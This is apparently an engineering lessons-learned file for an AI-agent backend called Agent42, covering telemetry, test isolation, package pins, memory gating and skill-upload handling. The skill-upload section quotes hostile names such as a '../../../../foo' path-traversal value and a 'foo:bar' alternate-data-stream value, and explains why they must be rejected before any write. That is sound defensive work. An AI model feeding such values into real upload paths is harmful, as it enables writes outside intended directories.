  `DefaultSearchDepth = 2` and `MaxSkillDirectorySearchDepth = 2`; `SearchDepth` governs the *resource*
  scan depth only (3 and 9 measured identical for skill discovery; 0 throws). A skill under **two**
  wrapper directories — a zipped parent folder, or a macOS archive — yields **nothing at all**. So a
  single `Discover(stagingRoot)` cannot normalize an arbitrary upload: walk the tree for `SKILL.md`
  yourself and point `Discover` **at each skill's own directory** (measured to work, and the same
  per-skill mechanism ADR 0048 relies on).
  **(3) `AgentSkillFrontmatter.ValidateName` is public and strict** (`^[a-z0-9]([a-z0-9]*-[a-z0-9])*[a-z0-9]*$`,
  max 64) — but it **accepts `con`, `aux` and `com1`**, which are Windows reserved device names, and
  `con.md` IS the CON device. Reject them separately, and never use `Path.GetInvalidFileNameChars()` for
  a shared rule: it returns the Windows set on Windows and only `{'\0','/'}` on Linux, so the same archive
  would be accepted in production and rejected in CI.
  **(4) `run_skill_script` is advertised UNCONDITIONALLY** — measured on a skill with no scripts and no
  runner supplied. Dropping script *files* does not remove the *tool*. What makes it safe is that
  `DisableRunSkillScriptApproval` stays **false** (so it is an `ApprovalRequiredAIFunction` and this grain
  has no approval loop) and no `AgentFileSkillScriptRunner` is registered (so invoking it throws
  `InvalidOperationException: … no AgentFileSkillScriptRunner was provided`). Do not "clean up" either.
- **And one about the ORDER of validation.** A bare `.md` upload has no directory yet, so that path — and
  only that path — scans the `name:` frontmatter line to choose one. **Validate that value before it
  touches the filesystem.** Writing `{staging}/{name}/SKILL.md` first and validating after makes
  `name: ../../../../foo` a path-traversal write and, on Windows, `name: foo:bar` an alternate-data-stream
  write, *before* any validator runs — and the same unvalidated value would become the normalized zip's
  top-level directory and part of the materialization path.
- **Evidence:** `src/Agent42.Agents/UserSkills/SkillPackage.cs`
  (`AllowedResourceExtensions`, `ScriptExtensions`, `MaxResourceDepth`, `IsSafeSkillName`,
  `ReservedDeviceNames`, `InvalidNameChars`, `StageBareMarkdown`, `CollectSkills`),
  `src/Agent42.Agents/UserSkills/TruncatingSkillsProvider.cs` (`ForSkillPaths` — the single place the
  script ban and the two approval flags live),
  `tests/Agent42.Tests/SkillPackageTests.cs` (`Normalize_DropsScripts_AndReportsThem`,
  `Normalize_HandlesHostileEntryNames`, `BareMarkdown_TraversalName_RejectedBeforeWrite`,
  `Upload_MultiSkillZip_InstallsEach` with its two- and four-wrapper rows),
  `tests/Agent42.Tests/AgentGrainTests.cs` (`SkillTools_NeverAdvertiseAScript_EvenWhenOneIsOnDisk`),
  `.agentic/decisions/0049-upload-agent-skills.md`
- **Verified:** 2026-08-25

### `src/Agent42.Agents/Skills/` is a CONTENT folder — never put `.cs` files in it

- **Claim:** `Agent42.Agents.csproj` has `<Content Include="Skills\**\*">` with `CopyToOutputDirectory`,
  because `SkillCatalog` reads shipped skills from `AppContext.BaseDirectory/Skills` at runtime. So a `.cs`
  file added under `Skills/` is **shipped as content into the deployed `Skills/` directory** and handed to
  `AgentFileSkillsSource`. Uploaded-skill code therefore lives in `UserSkills/` (ADR 0049) in **both**
  projects — the one place in this repo where a feature folder is named around an existing folder rather
  than after the feature. `ProjectLayoutTests.ExpectedFolders` pins both names, and its doc-comment says
  why, so the pair cannot be "tidied" into one.
- **Also: uploaded skills are materialized into `Path.GetTempPath()`, never beside the shipped ones.**
  `src/Agent42.Backend/Dockerfile` ends with `USER $APP_UID`, so the app runs non-root and `/app` is not
  writable — writing uploads next to the shipped skills would work on a dev box and fail in production.
  And `SkillCatalog`'s `Lazy` cache is process-wide, so it would serve one user's uploads to everyone.
  The materialized tree is a **cache, not the record**: blob storage is durable, a restart wipes the tree,
  and the next activation re-materializes.
- **Evidence:** `src/Agent42.Agents/Agent42.Agents.csproj` (the `Content` glob),
  `src/Agent42.Agents/Tools/SkillCatalog.cs` (reads `AppContext.BaseDirectory/Skills`),
  `src/Agent42.Agents/UserSkills/UserSkillProvider.cs` (`MaterializationRoot`),
  `src/Agent42.Backend/Dockerfile` (`USER $APP_UID`),
  `tests/Agent42.Tests/ProjectLayoutTests.cs` (`ExpectedFolders`),
  `.agentic/decisions/0049-upload-agent-skills.md`
- **Verified:** 2026-08-25

### A Google Calendar connection dies SILENTLY in three ways, and none of them errors at connect time

- **Claim:** the calendar tools (ADR 0053) fail by going *quiet*, not by throwing, so all three of these
  look identical to the user — the assistant simply says it is not connected — and none is visible in a
  test:
  1. **A missing `access_type=offline` or `prompt=consent`** on the authorization URL. Google then
     returns **no refresh token** on a re-consent. The connect flow reports success and the calendar
     stops answering roughly **an hour later**, at the first access-token expiry. Both parameters are
     pinned by `AuthorizationUrl_RequestsOfflineAccessAndConsent`, and the callback additionally refuses
     a token response that carried no refresh token — reporting failure now beats a success that
     evaporates.
  2. **The OAuth consent screen left in *Testing* status** (External user type). Google revokes every
     refresh token after **7 days**. This is entirely outside the repo — no code change can detect or
     fix it — and the symptom is a connection that worked all week and died on the same weekday. It is
     step 2 of `docs/integrations/google-calendar/README.md` for that reason.
  3. **A Data Protection key ring that is not persisted out of process.** `GoogleSecretProtector.Unprotect`
     **swallows** `CryptographicException` and returns null (deliberately — a throw would cost the user
     their whole turn), so after a restart with a rotated ring every stored refresh token is
     undecryptable and every user reads as *not connected*. The `dataprotection` blob container (ADR
     0018) is what keeps this from happening; the only trace is a `LogWarning` naming the cause.

  Related, and the same class of trap in the other direction: the config section is `GoogleCalendar:*`
  while the routes are `/api/google/*`. That asymmetry is **deliberate** — `Geocoding:GoogleApiKey`
  already exists, and two differently-scoped "Google" keys adjacent in `appsettings.json` is how an
  operator pastes the wrong secret; the routes stay provider-named because the redirect URI is a
  hand-registered constant in Google Cloud. Renaming the routes means re-registering it by hand.
- **Evidence:** `src/Agent42.Backend/Calendar/GoogleOAuth.cs` (`BuildAuthorizationUrl`),
  `src/Agent42.Backend/Calendar/AgentApi.Calendar.cs` (the `no_refresh_token` refusal),
  `src/Agent42.Backend/Calendar/GoogleSecretProtector.cs`,
  `docs/integrations/google-calendar/README.md`,
  `.agentic/decisions/0053-google-calendar-tools.md`
- **Verified:** 2026-08-26

### `LogRecord` is POOLED — retaining one in a `BaseProcessor` silently corrupts the buffer

- **Claim:** A `BaseProcessor<LogRecord>` that stores the `LogRecord` reference and reads its fields
  later gets the **latest** record back for every entry it kept. The SDK pools and reuses the instance.
  Measured twice against the pinned OpenTelemetry 1.18.0 — including once inside this repo's exact
  pipeline (`LoggerFactory` + `AddOpenTelemetry` + `IncludeFormattedMessage`) — two log calls yielded
  `count=2 distinctRefs=1`, and *both* buffered entries read back as the **second** message.
  **Nothing throws.** The console just shows the same line N times, which reads like a rendering bug
  rather than a capture bug, and is the reason this cost real time.
  Every field must be copied **inside `OnEnd`** — `CategoryName`, `LogLevel`, `FormattedMessage`,
  `Exception`, timestamp, trace/span ids — and `Attributes` must be materialised into a **new list**:
  keeping the `IReadOnlyList` reference is the same bug wearing a different hat, because that list is
  part of the pooled buffer. Scope output likewise (`ForEachScope` into a fresh list). Values read
  inside `OnEnd` are correct; that window is the whole contract.
  `Activity` is the **opposite** — measured `captured=6 distinctRefs=6`, not pooled — so the same
  reasoning does not transfer between the two processors. `LiveSpanProcessor` projects anyway, but only
  to make the buffer's byte budget computable.
  `LiveLogProcessorTests.LogProcessor_DoesNotRetainThePooledRecord` is written to fail against the naive
  implementation, not merely to pass against the correct one.
- **Evidence:** `src/Agent42.Backend/Telemetry/LiveLogProcessor.cs`,
  `tests/Agent42.Tests/LiveLogProcessorTests.cs`,
  `.agentic/decisions/0054-live-otel-console.md`
- **Verified:** 2026-08-27

### `MetricType` has EIGHT members — a five-arm switch reads `NaN` for 39% of the real instruments

- **Claim:** Beyond the obvious `LongSum, DoubleSum, LongGauge, DoubleGauge, Histogram` there are
  **`ExponentialHistogram`, `LongSumNonMonotonic` and `DoubleSumNonMonotonic`**. These are not exotic
  corner cases: measured live against DevHost, **11 of 28 captured instruments were
  `LongSumNonMonotonic`** — among them `dotnet.process.memory.working_set`,
  `dotnet.gc.last_collection.heap.size` and `dotnet.gc.last_collection.memory.committed_size`, all from
  the standard `AddRuntimeInstrumentation` set. A switch covering only the obvious five falls through to
  a default and reports `NaN` for them, which renders as data-shaped nonsense rather than as an error.
  A non-monotonic sum is read with the **same** `GetSumLong()` / `GetSumDouble()` accessors as a
  monotonic one — the bug is a missing switch arm, not a missing API, which is why it is so easy to
  write and so hard to see. An unrecognised member must be recorded as a **null value with a detail
  naming the type**, never as a silent `NaN`.
  Two related mechanics: `MetricPoint` is enumerated by reference
  (`foreach (ref readonly var p in metric.GetMetricPoints())`) so it cannot be captured by a lambda; and
  `ExponentialHistogram` cannot be produced by an instrument alone — it needs a
  `Base2ExponentialBucketHistogramConfiguration` **view**, which is how the test covers all eight members
  with real SDK data instead of a hand-written list that would only be testing itself.
- **Evidence:** `src/Agent42.Backend/Telemetry/LiveMetricExporter.cs`,
  `tests/Agent42.Tests/LiveMetricExporterTests.cs`,
  `.agentic/decisions/0054-live-otel-console.md`
- **Verified:** 2026-08-27

### The gen_ai metrics ride a meter named after `sourceName` — and `AddSource` alone drops every one

- **Claim:** `UseOpenTelemetry(sourceName: X)` on an `IChatClient` names **both** the `ActivitySource` and
  the `Meter` `X` — `_meter = new(string.IsNullOrEmpty(sourceName) ? DefaultSourceName : sourceName)`.
  `MultiProviderChatClientFactory` passes `OtelSourceName`, so the four gen_ai histograms
  (`gen_ai.client.token.usage`, `.operation.duration`, `.operation.time_to_first_chunk`,
  `.operation.time_per_output_chunk`) are published on a meter called **`"Agent42.Backend"`**, *not* on
  `"Microsoft.Extensions.AI"` — which is the name every doc and blog post tells you to register, and which
  is wrong for this app precisely *because* it passes a custom `sourceName`.
  **A `MeterProvider` subscribes by meter name and nothing else, so getting this wrong fails in complete
  silence.** The instruments are still created and every measurement is still recorded; the SDK simply
  never listens, and the result is an empty series rather than an error, a warning or a missing-meter
  diagnostic. That is how the app shipped from ADR 0013 through ADR 0054 with `AddSource(OtelSourceName)`
  and no matching `AddMeter` — the token histograms were live the whole time and discarded on every turn,
  which is a large part of why ADR 0031's usage dashboard had to reconstruct token counts from **spans**.
  **`AddSource` and `AddMeter` are separate subscriptions to the same name** and neither implies the
  other, so any future host that traces this app must register both. The single `AddMeter` lives in
  `AddLiveTelemetryCapture` and is **deliberately outside** that method's `addInstrumentation` gate, which
  is the one thing about it easy to get wrong: the gate's `true` branch is DevHost's, and the *Backend* —
  the only host that ever talks to a real model — passes `false`. Subscribing next to the matching
  `AddSource` inside that branch reads as the natural home for it and would leave production exactly as
  broken while the offline host looked fine, which is why `CaptureWiring_CollectsTheChatClientTokenHistogram`
  is a `[Theory]` over **both** values rather than a fact. It is also the one line of that method that
  changes what the Backend ships to its **OTLP collector** — the class summary's "purely additive" claim
  carries an explicit exception for it — because both metric readers hang off one `MeterProvider`.
  It sits there rather than in `Program.cs` for a second reason worth knowing before moving it back:
  **nothing in the suite runs `Program.cs`**, so a registration there is untestable by construction *and*
  scores 0% on the new-code coverage gate (ADR 0050).
  **The Agent Framework agent layer emits no metrics at all** and cannot be the fix: `Microsoft.Agents.AI`
  1.19.0 (verified against the assembly — `.AI`, `.Abstractions` and `.OpenAI` all contain zero
  `System.Diagnostics.Metrics` / `CreateHistogram` / `CreateCounter` references) is **trace-only**
  (`OpenTelemetryAgent`, `OpenTelemetryConsts`), an acknowledged .NET/Python gap —
  microsoft/agent-framework#2688. The agent-level instruments the framework docs advertise
  (`agent.invocation.duration`, `agent_framework.function.invocation.duration`, `agent.token.usage`) are
  the **Python** SDK's, so `AddMeter("*Microsoft.Agents.AI")` subscribes to nothing here. Every gen_ai
  metric this app has comes from the `Microsoft.Extensions.AI` client underneath the agent.
  `MeterNamingTests` asserts the naming rule in **both** directions against the real library, because the
  positive alone would still pass if the instruments were published on both names.
- **Evidence:** `src/Agent42.Backend/Telemetry/LiveTelemetryCaptureExtensions.cs`
  (the unconditional `metrics.AddMeter(OtelSourceName)`),
  `src/Agent42.Backend/Models/ChatClientFactory.cs` (`_otelSourceName`),
  `tests/Agent42.Tests/MeterNamingTests.cs`
- **Verified:** 2026-08-27

### A diagnostics console watches itself, and the obvious log filter blinds it instead

- **Claim:** A page that polls `/api/diagnostics/*` every couple of seconds produces a server span **and**
  request log lines on every tick, so an unfiltered ring fills with the console observing itself.
  The **span** half is easy — drop spans whose `url.path`/`http.route` starts with the diagnostics
  prefix, mirroring ServiceDefaults' `HealthEndpointPath` filter.
  The **log** half is the trap: the noise is `Microsoft.AspNetCore.Hosting.Diagnostics`
  "Request starting"/"Request finished", a **shared** category every other request also uses, so
  filtering by category removes all request logging from the console — the exact capability someone
  opened it for. Key off the **request path** instead, and reach it two independent ways, because
  neither is reliable at the moment a record is written: the ambient `Activity`'s `url.path`/`http.route`
  tag (absent until the instrumentation has enriched the activity) and the record's own **`Path`** state
  attribute (which the hosting logger sets on both request messages regardless of instrumentation).
  **Use `Path`, not `RequestPath`** — measured, `RequestPath` exists only inside a formatted *scope*
  string (`"RequestPath:/ RequestId:..."`), so a filter reading state attributes never sees it and
  listing it is dead code that reads as extra thoroughness.
  **The allowlist of path-bearing keys is the load-bearing half, not the string match.** Consult only
  `url.path`/`http.route`/`http.target` (and the log record's `Path`), and match them by **prefix**. A
  match-anywhere check, or one applied to every tag, drops a span whose `gen_ai.tool.call.result` merely
  *quotes* the route — a fetched web page, a tool result — which is exactly the content the console
  exists to show. Any looser `"{method} {route}"` matching belongs on the activity's **display name**
  alone, which is framework-generated and never carries model or web content.
  This bites hardest **offline**: `tools/Agent42.DevHost` has no `appsettings.json` at all, so its floor
  is `Information` with no `Microsoft.AspNetCore` override. Measured there after ~15 polls: **6 spans / 0
  diagnostics spans**, and **63 logs of which 12 were `Hosting.Diagnostics` records for genuine requests
  and 0 were diagnostics polls** — both halves of the property in one measurement.
  **Metrics are deliberately exempt.** The snapshot is fixed-size and replaced wholesale, so there is no
  ring to flood, and `http.server.request.duration` legitimately carries a `/api/diagnostics/*` route
  dimension. Filtering it would misreport the app's actual request mix.
- **Evidence:** `src/Agent42.Backend/Telemetry/LiveTelemetryFilter.cs`,
  `tests/Agent42.Tests/LiveLogProcessorTests.cs`, `tests/Agent42.Tests/LiveSpanProcessorTests.cs`,
  `.agentic/decisions/0054-live-otel-console.md`
- **Verified:** 2026-08-27

### xUnit v2 runs `IAsyncLifetime` per TEST, so a cluster built there is deployed per test

- **Claim:** xUnit constructs a **new instance of the test class for every test method**, so
  `IAsyncLifetime.InitializeAsync` on the class runs per test, not per class. A test class that
  builds a `TestClusterBuilder` there deploys a fresh two-silo Orleans cluster (~1.2s) and, for an
  API class, a whole `MapAgentApi` host, once per test. That single fact was most of a 7m38s test
  suite; `IClassFixture<T>` is the per-class seam, and it took the suite to 31s (ADR 0055).
  **Do not reach a shared cluster by taking `SharedClusterFixture` directly** — derive from
  `SharedClusterTests<TFixture>`, which resets the mutable per-silo fakes before each test and
  cannot be overridden past. `SharedClusterSeamTests` fails the build's test run if a class skips it.
  Sharing is **not** universally safe: it holds only where grain keys are unique per test, no
  assertion reads an unreset per-silo singleton, and nothing asserts a cluster-wide aggregate. Six
  classes are deliberately left cluster-per-test for failing one of those — the three Usage classes
  (a well-known global grain key with absolute-total assertions), `ActivityPropagationTests` (the
  two-cluster comparison IS the test), `AttachmentRehydrateTests` (its own configurator), and
  `ChatStreamDisconnectTests`, which ADR 0046 pins to a real Kestrel server and a raw socket.
  Read ADR 0055's three checks before converting a class or adding a new one.
- **Evidence:** `tests/Agent42.Tests/SharedClusterTests.cs`, `tests/Agent42.Tests/SharedClusterFixture.cs`,
  `tests/Agent42.Tests/SharedClusterSeamTests.cs`; `.agentic/decisions/0055-one-orleans-cluster-per-test-class.md`
- **Verified:** 2026-08-27

### A live Orleans reminder outlives its test once the cluster is shared

- **Claim:** `AgentGrain.Scheduling.cs` registers a **real** reminder with Orleans' **1-minute
  minimum**, backed by `UseInMemoryReminderService()` per silo, and nothing ever cancels it. Under
  the old cluster-per-test shape this was invisible: the cluster was disposed after ~1.3s, so no
  reminder ever fired. In a class-scoped cluster the reminders accumulate, and **any class whose
  tests take more than a minute in total will fire one mid-test** — `ReceiveReminder` then runs a
  full turn and pushes into `RecordingPushNotificationSender`, perturbing any assertion on a
  cluster-wide aggregate. It is a **CI-only** flake: a class is ~9s locally but CI runs under
  `--collect:"XPlat Code Coverage"` on a hosted runner. The rule for every shared-cluster class is
  therefore: **assert on state scoped to your own user or grain, never on a cluster-wide total** —
  which is why `AgentGrainTests`' push assertions filter by userId (`SendsFor`) rather than counting
  every send. Cancelling the reminders in `src/` was rejected: a production change to fix a test.
- **Evidence:** `src/Agent42.Agents/Scheduling/AgentGrain.Scheduling.cs`,
  `tests/Agent42.Tests/RecordingPushNotificationSender.cs`, `tests/Agent42.Tests/TestSiloConfigurator.cs`
- **Verified:** 2026-08-27

### `OpenAI` is pinned to 2.12.0 because 2.13.0 kills any stream with an empty `choices` chunk

- **Claim:** `Microsoft.Extensions.AI.OpenAI` probes `"$.choices[0].delta.reasoning_content"` on
  **every** streaming update (it exists to surface DeepSeek-style `reasoning_content`), and
  `OpenAI`'s generated `StreamingChatCompletionUpdate.PropagateGet` indexes `Choices[index]` with
  **no bounds check**. In 2.12.0 that read resolves from stored JSON and the propagator is never
  reached; **2.13.0 routes it through the typed indexer**, so a chunk carrying an **empty `choices`
  array** throws `ArgumentOutOfRangeException` out of `List<T>.get_Item` and takes down the whole
  stream, not one chunk. Azure sends exactly such chunks — the leading `prompt_filter_results` one,
  and the trailing usage-only one — so the symptom is a reply that dies mid-flight on the **Chat
  Completions** path (`Provider.OpenAICompatible`, and Foundry when `UseResponsesApi` is false).
  The Responses path builds a different client and never reaches this code, which is why prod
  Foundry did not see it. Measured with everything else held equal: **2.12.0 → `found=False`, stream
  completes; 2.13.0 → throws.** `PropagateGet`'s own IL is byte-identical between the two, so
  diffing that method "proves" the versions are equivalent — they are not; the change is upstream of
  it, in whether the propagator is consulted at all. **Do not let a routine outdated-package sweep
  raise `OpenAI`** (hard rule 4 says resolve latest stable — this pin is the documented exception).
  It is enforced two ways: `StreamingEmptyChoicesTests` fails, and the direct
  `Microsoft.Extensions.AI.OpenAI` 10.9.0 reference declares `OpenAI [2.12.0, 2.13.0)`, so restore
  itself refuses 2.13.0 — a restore error there is the guard working, not a broken lockfile. Lift
  the pin only against a released `OpenAI` whose `PropagateGet` bounds-checks, with that test green.
- **Evidence:** `Directory.Packages.props` (the pin + its note),
  `src/Agent42.Backend/Agent42.Backend.csproj` (the direct 10.9.0 reference that makes the range bind),
  `tests/Agent42.Tests/StreamingEmptyChoicesTests.cs`,
  `src/Agent42.Backend/Models/ChatClientFactory.cs` (`Provider.OpenAICompatible` — the affected path)
- **Verified:** 2026-08-27

### The memory provider is built at ACTIVATION but the incognito gate is per-TURN — it must be a delegate

- **Claim:** `HindsightMemoryProvider` (ADR 0056) is constructed in `BuildAgent`, which runs on **activation**
  and on the five rebuild paths (`BindAgentAsync`, `SwitchModelAsync`, `RebindModelAsync`,
  `RegisterDocumentAsync`, `SetEnabledToolsAsync`) — and **never per turn**. `_ephemeral` is the opposite:
  turn-scoped, set at the top of `ChatAsync` and cleared in its `finally` (ADR 0034). So the obvious
  spelling — `new HindsightOptions { … Enabled = !_ephemeral }` — captures whatever the flag happened to be
  when the agent was built and is then **wrong for every later turn of a warm activation**: an incognito
  chat gets retained, or a normal chat silently stops being remembered, depending on which way the capture
  froze. Nothing throws; the tests that pass are the ones you would write first. `HindsightOptions.IsEnabled`
  is a `Func<bool>` for exactly this reason and Agent42 passes `IsEnabled = () => !_ephemeral` — the
  `BuildDocumentSearchProvider` shape, a closure over the grain read at invoke time. **Which test actually
  catches it, measured rather than assumed** (2026-08-28, by mutating the provider two ways and running the
  pair): with the value captured at build time — the realistic bug, since `BuildAgent` runs at activation
  where `_ephemeral` is false — **both** `EphemeralTurn_NeitherRecallsNorRetains` and
  `MemoryResumes_OnTheNormalTurnAfterAnEphemeralOne` fail. With the gate stuck OFF instead (the
  capture-of-true direction), **only `MemoryResumes_…` fails; `EphemeralTurn_…` passes**, because asserting
  "nothing was recorded" is satisfied by a provider that never records anything. So
  **`MemoryResumes_OnTheNormalTurnAfterAnEphemeralOne` is the load-bearing one** — it is the only test that
  fails in both directions, and deleting it as "redundant with the incognito test" would leave the gate
  free to be silently stuck off. Same trap as `_turnLocation`.
- **The SELECTION gate added by ADR 0057 is the opposite case, and the asymmetry is deliberate.**
  `BuildMemoryProvider` now takes the effective selection and returns null when it lacks
  `ToolCatalog.Memory` — read at **build time**, as a plain value, not through a delegate. That is
  correct for the two layers that *rebuild*: `SetEnabledToolsAsync` does the snapshot/rebuild/restore/write
  dance explicitly, `BindAgentAsync` rebuilds, and activation builds from scratch — whereas nothing
  rebuilds between turns of a warm activation, which is what forces `_ephemeral` into a delegate.
  **But the USER-DEFAULT layer is stale by design, and for `memory` that staleness bites harder than for
  any other key.** `_userDefaultEnabledTools` is assigned only in `OnActivateAsync`
  (`AgentGrain.cs:224`), so changing the Preferences default does **not** rebuild a warm grain — the
  documented accepted staleness of the `null == all` entry above. For `web_search` that means a tool
  lingers one activation too long. For `memory` it means a user who has just switched off **the widest
  egress in the app keeps POSTing their conversation to a third party** in every already-warm chat until
  it deactivates. That is inherited behaviour, not a defect introduced by ADR 0057, and it was
  deliberately not fixed there — but do not repeat the flat claim that a build-time read "can never go
  stale". It cannot go stale on the override/agent layers; it can on the user default. **Do not
  "harmonise" the two**: folding the selection into `IsEnabled` is unnecessary indirection, and folding
  `_ephemeral` into the build-time check is the bug the entry above describes. The guard on the rebuild
  half is `TogglingMemoryMidChat_DetachesOnTheSameActivation` — two turns on one activation, and the only
  test in the ADR 0057 set that fails in **both** mutation directions (measured 2026-08-29). Keep the
  `_memory.Client is null` term **first** in that predicate: it is what makes
  `UnconfiguredMemory_MakesNoCalls` assert zero calls rather than failing ones.
- **Evidence:** `src/Agent42.Agents/Memory/AgentGrain.Memory.cs`,
  `src/Agent42.Agents/Conversations/AgentGrain.cs` (`_ephemeral` and its `finally`),
  `src/Agent42.Agents/Documents/AgentGrain.Documents.cs` (`BuildDocumentSearchProvider`, the shape copied),
  `tests/Agent42.Tests/AgentGrainTests.cs` (`EphemeralTurn_NeitherRecallsNorRetains`,
  `MemoryResumes_OnTheNormalTurnAfterAnEphemeralOne`,
  `TogglingMemoryMidChat_DetachesOnTheSameActivation`, `MemoryDeselected_NeitherRecallsNorRetains`,
  `MemorySelection_IsNotIntersectedWithCapability`),
  `.agentic/decisions/0056-hindsight-long-term-memory.md`,
  `.agentic/decisions/0057-memory-as-a-selectable-tool.md`
- **Verified:** 2026-08-29

### `InvokingContext` has no `RequestMessages`, and injected `Instructions` neither come back nor accumulate

- **Claim:** the two halves of `AIContextProvider` are **not symmetric**, and assuming they are costs a
  compile error at best and a wrong port at worst. `InvokedContext` exposes `Agent`, `Session`,
  `RequestMessages`, `ResponseMessages` and `InvokeException`. `InvokingContext` exposes only `Agent`,
  `Session` and **`AIContext`** — there is no `RequestMessages` on it, and the run's incoming messages
  arrive on **`context.AIContext.Messages`**. Measured by reflection against `Microsoft.Agents.AI` 1.19.0,
  after the plan for ADR 0056 asserted the opposite from an earlier reading.
  Two further behaviours were measured with a spike (a real `ChatClientAgent` over a fake `IChatClient`,
  a provider injecting `## Memories\n- …`), because both look like risks and neither is: (1) the injected
  text is **appended to `ChatOptions.Instructions`** and never becomes a message, so
  `InvokedContext.RequestMessages` contained **only** `[user] a question` — which is why the Python
  original's `exclude_sources` feedback-loop guard ports as *nothing*, and why recall costs nothing against
  the 2 MB session cap (ADR 0004); and (2) across three turns through one held `ChatOptions` the model saw
  `## Memories` **exactly once per turn** (`instructions length=71`, unchanged) and the held instance was
  **never mutated** — the framework composes a per-run copy, so a warm activation's system prompt does not
  grow without bound even though `BuildAgent` holds one `ChatOptions` for the activation's life.
- **Evidence:** `src/Agent42.Agents/Memory/AgentGrain.Memory.cs`,
  `tests/Agent42.Tests/AgentGrainTests.cs` (`AgentChat_InjectsRecalledMemories`),
  https://github.com/Expecho/Hindsight.AgentFramework.Net (`HindsightMemoryProvider`, and
  `Memories_DoNotAccumulateAcrossTurns` / `InjectedMemories_AreNotRetained` in its test suite),
  `.agentic/decisions/0056-hindsight-long-term-memory.md`
- **Verified:** 2026-08-28
### A live-telemetry test host captures from a PROCESS-GLOBAL source, so those classes must not run in parallel

- **Claim:** `AddLiveTelemetryCapture` (ADR 0054) subscribes its `LiveTelemetryBuffer` to the
  `ActivitySource` named `Agent42.Backend` — a **process-wide name, not a per-host one**. The buffer
  instance is per-host and looks isolated; the thing feeding it is not. So while one test's host is
  alive, a span emitted **anywhere else in the process** on that source lands in *its* buffer. xUnit
  runs test classes in parallel by default, and two classes sat on opposite sides of exactly that:
  `MeterNamingTests` drives a real instrumented chat call through
  `UseOpenTelemetry(sourceName: LiveTelemetryCaptureExtensions.OtelSourceName)`, which **emits a span**,
  while `OtelConfigurationTests.AddLiveTelemetryCapture_ComposesWithTheDualExporterPipeline` asserts its
  freshly-built buffer is still **empty**. Intermittent `Assert.Empty() Failure: Collection was not
  empty` — measured at roughly **2 failures in 6 runs** under `--collect:"XPlat Code Coverage"`, and it
  failed the **`new-code-coverage` PR check**, which is a blocking gate. It is timing-sensitive rather
  than new: four consecutive coverage runs on an unmodified `main` worktree were green, so a branch that
  merely adds tests (a longer run, more overlap) can surface it without having caused it. **The fix is
  the shared `[Collection("LiveTelemetry")]`** — xUnit never runs two classes of one collection
  concurrently. **Any new test
  class that builds a live-capture host, or that emits on `OtelSourceName`, must join that collection**;
  the failure it prevents lands in a *different* class than the one you added, which is what makes it
  hard to attribute.
- **⚠ CORRECTION 2026-09-03 (ADR 0062): the collection is NOT a sufficient fix, and believing it is
  costs a session.** The claim above that it made the test deterministic "6/6 green after" does not
  hold. During the Orleans 10.3.1 bump the four remaining live-capture classes
  (`LiveMetricExporterTests`, `LiveSpanProcessorTests`, `LiveTelemetryBufferTests`,
  `LiveTelemetryCaptureWiringTests`) were added to the collection as this entry instructs — and the
  test still failed **0 of 2 runs green under `--collect:"XPlat Code Coverage"`**, which is the CI path.
  Dumping the buffer on a failing run showed the contaminants were **not `OtelSourceName` spans at all**:

  ```
  Source = Microsoft.AspNetCore, Name = PUT /api/conversations/{conversationId}/pin
  Source = Microsoft.AspNetCore, Name = GET /api/conversations
  ```

  **The mechanism is one level above `AddSource`.** That test calls `ConfigureOpenTelemetry()`, which
  subscribes to the **ASP.NET Core instrumentation**, and an `ActivityListener` is process-global — so
  while such a host is alive it captures **every server span in the process**. The contaminators are
  therefore **the entire API test suite**, not the handful of classes that emit gen_ai spans. No
  collection membership can ever cover that, and **adding a fifth class to the collection is the wrong
  lever** — that is the specific wasted session this correction exists to prevent.
  **The actual fix for an emptiness assertion is to SCOPE it to the source under test** (see
  `OtelConfigurationTests`, which now filters on
  `s.Source == LiveTelemetryCaptureExtensions.OtelSourceName`). That is not a weakened assertion: nothing
  in that test emits on `OtelSourceName`, and the one class that does is serialised with it by the
  collection, so a span there would still be a real defect. Measured **4/4 green under `--collect`**
  after scoping, where it was 0/2. The collection additions were kept — they are correct on their own
  terms — but they are not what fixed it. Note the failure is far likelier under coverage
  instrumentation, because the instrumented host build holds the listener open for **seconds** rather
  than milliseconds.
- **Evidence:** `tests/Agent42.Tests/LiveTelemetryCollection.cs` (carries the same correction),
  `tests/Agent42.Tests/OtelConfigurationTests.cs`
  (`AddLiveTelemetryCapture_ComposesWithTheDualExporterPipeline`, the scoped assertion),
  `tests/Agent42.Tests/MeterNamingTests.cs`,
  `src/Agent42.Backend/Telemetry/LiveTelemetryCaptureExtensions.cs` (`OtelSourceName`, `AddSource`),
  `.agentic/decisions/0062-orleans-dashboard-owner-restricted.md`
- **Verified:** 2026-09-03 (the 2026-08-28 fix was measured incomplete; see the correction)

### A collection expression into `IReadOnlyList<T>` written from INSIDE a grain is unreadable from Cosmos

- **Claim:** a collection expression targeting `IReadOnlyList<T>` does **not** compile to a `List<T>`. It
  produces a compiler-internal type. Measured on .NET 10, each of these was printed from a running test:

  | Expression | Runtime type |
  |---|---|
  | `[.. src.Select(...).Where(...)]` (no known count) | `<>z__ReadOnlyList`1` |
  | `[.. src]` where `src` is an `IReadOnlyList<T>` (known count) | `<>z__ReadOnlyArray`1` |
  | `["a", "b"]` (multi-element literal) | `<>z__ReadOnlyArray`1` |
  | `["a"]` (single-element literal) | `<>z__ReadOnlySingleElementList`1` |

  `JsonGrainStorageSerializer` (the Cosmos path, ADR 0039) writes that name into the document's `$type` and
  then **cannot construct it on read**. The document is not subtly wrong, it is **unreadable**, and it
  strands the whole state root — for `mcp-servers` that is every one of a user's MCP servers, their
  encrypted secrets and their OAuth token.
  **⚠ The failure MESSAGE is Orleans-version-sensitive; the failure is not.** Measured on both sides of the
  10.2.2 → 10.3.1 bump (ADR 0062):

  | Orleans | Message |
  |---|---|
  | 10.2.2 | ``Unable to find a constructor to use for type <>z__ReadOnlyArray`1[System.String]`` (from `[.. toolNames]`), and ``... <>z__ReadOnlyList`1[System.String]`` (from a `Select`/`Where` spread) |
  | 10.3.1 | ``Unable to resolve type "<>z__ReadOnlyArra…"`` — it now fails resolving the `$type` rather than constructing it |

  So the repo's guard test pins a substring that **moves on an Orleans bump**: expect it to be the first
  thing that goes red, update the quoted string, and do **not** soften it to a bare `Assert.NotNull` — the
  state is still unreadable and the assertion is what would catch a real regression. It asserts only the
  message, so it does not pin which type maps to which shape; the table above is that measurement, and it is
  what makes the entry actionable.
- **Nothing warns.** It serializes fine, so a write-side test passes. The binary
  `SerializationCompatibilityTests` passes too, because Orleans' own serializer handles these types happily.
  Only the Cosmos JSON path sees it — the same split ADR 0045 recorded for a different reason.
